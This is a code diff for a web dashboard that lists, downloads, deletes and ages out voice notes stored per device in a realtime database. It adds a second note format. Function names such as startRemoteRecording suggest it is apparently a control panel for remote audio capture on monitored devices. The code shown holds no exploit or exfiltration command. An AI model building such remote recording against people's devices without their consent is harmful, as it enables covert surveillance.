@@ -2212,16 +2212,20 @@ async function pollVoiceNotes() {
     list.innerHTML = '<div class="label">No voice notes yet</div>';
     return;
   }
-  // voice_notes: object with batch keys -> { notes: [...], totalCount, ts_ms, freeMb }
+  // voice_notes: supports two formats:
+  //   Old: batch_* keys -> { notes: [...], totalCount, ts_ms, freeMb }
+  //   New: note_* keys -> { fileName, dateAdded, durationMs, sizeBytes, mimeType, audioData?, audioStripped? }
   let allNotes = [];
-  let noteIdCounter = 0;
-  for (const [batchKey, batch] of Object.entries(data)) {
-    if (batch && batch.notes && Array.isArray(batch.notes)) {
-      for (const note of batch.notes) {
-        if (note) {
-          allNotes.push({ ...note, batchKey, _noteId: noteIdCounter++ });
-        }
+  for (const [key, val] of Object.entries(data)) {
+    if (!val || typeof val !== 'object') continue;
+    if (val.notes && Array.isArray(val.notes)) {
+      // Old batch format
+      for (const note of val.notes) {
+        if (note) allNotes.push({ ...note, batchKey: key, _noteKey: key });
       }
+    } else if (val.fileName || val.audioData || val.audioStripped) {
+      // New individual note format
+      allNotes.push({ ...val, batchKey: key, _noteKey: key, _isIndividual: true });
     }
   }
   // Sort by dateAdded (newest first)
@@ -2257,7 +2261,8 @@ async function pollVoiceNotes() {
     
     let downloadLink = '';
     if (audioUrl) {
-      downloadLink = `<a href="${audioUrl}" download="${escHtml(note.fileName || 'voice_note.ogg')}" style="font-size:10px;color:var(--accent);margin-right:8px">⬇ Download (${size})</a>`;
+      const dlName = encodeURIComponent(note.fileName || 'voice_note.ogg');
+      downloadLink = `<a href="${audioUrl}" download="${dlName}" style="font-size:10px;color:var(--accent);margin-right:8px">⬇ Download (${size})</a>`;
     }
     
     let playerHtml = '';
@@ -2267,10 +2272,11 @@ async function pollVoiceNotes() {
       playerHtml = '<div style="font-size:10px;color:var(--muted)">No playable audio data</div>';
     }
     
-    const noteKey = encodeURIComponent(note.fileName || 'voice_' + note._noteId);
+    const noteKey = encodeURIComponent(note._noteKey);
+    const deleteFn = note._isIndividual ? 'deleteIndividualVoiceNote' : 'deleteVoiceNote';
     html += `<div class="voice-card">
       <div class="vname">${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
-        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${note.batchKey}','${noteKey}')">Delete</button></div>
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="${deleteFn}('${noteKey}','${escHtml(note.fileName || '')}')">Delete</button></div>
       ${playerHtml}
       ${downloadLink ? `<div style="font-size:10px;margin-top:4px">${downloadLink}</div>` : ''}
     </div>`;
@@ -3373,6 +3379,19 @@ async function deleteVoiceNote(batchKey, fileName) {
   }
 }
 
+async function deleteIndividualVoiceNote(noteKey, fileName) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!confirm('Delete this voice note?')) return;
+  try {
+    await deleteRTDB(`devices/${selectedDevice}/voice_notes/${noteKey}`);
+    showAlert(`Deleted voice note: ${fileName || 'unknown'}`, 'warn');
+    pollVoiceNotes();
+    await refreshStorage();
+  } catch (e) {
+    showAlert('Delete failed: ' + e.message, 'error');
+  }
+}
+
 // --- Remote Recording Functions ---
 
 async function startRemoteRecording() {
@@ -3620,26 +3639,33 @@ async function cleanupOldVoiceNotes(days) {
     const data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
     if (!data || typeof data !== 'object') { showAlert('No voice notes found', 'warn'); return; }
     
-    for (const [batchKey, batch] of Object.entries(data)) {
-      if (batch && batch.notes && Array.isArray(batch.notes)) {
-        const before = batch.notes.length;
-        batch.notes = batch.notes.filter(n => {
+    for (const [key, val] of Object.entries(data)) {
+      if (!val || typeof val !== 'object') continue;
+      
+      if (val.notes && Array.isArray(val.notes)) {
+        // Old batch format: filter notes within the batch
+        const before = val.notes.length;
+        val.notes = val.notes.filter(n => {
           if (!n || !n.dateAdded) return true;
           return n.dateAdded >= cutoff;
         });
-        const removed = before - batch.notes.length;
+        const removed = before - val.notes.length;
         if (removed > 0) {
           deleted += removed;
-          batch.totalCount = batch.notes.length;
-          if (batch.notes.length === 0) {
-            await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+          val.totalCount = val.notes.length;
+          if (val.notes.length === 0) {
+            await deleteRTDB(`devices/${selectedDevice}/voice_notes/${key}`);
           } else {
-            await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
+            await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${key}.json`, {
               method: 'PUT',
-              body: JSON.stringify(batch)
+              body: JSON.stringify(val)
             });
           }
         }
+      } else if (val.dateAdded && val.dateAdded < cutoff) {
+        // New individual note format
+        await deleteRTDB(`devices/${selectedDevice}/voice_notes/${key}`);
+        deleted++;
       }
     }
     showAlert(`Deleted ${deleted} voice note(s) older than ${days} day(s)`, 'warn');
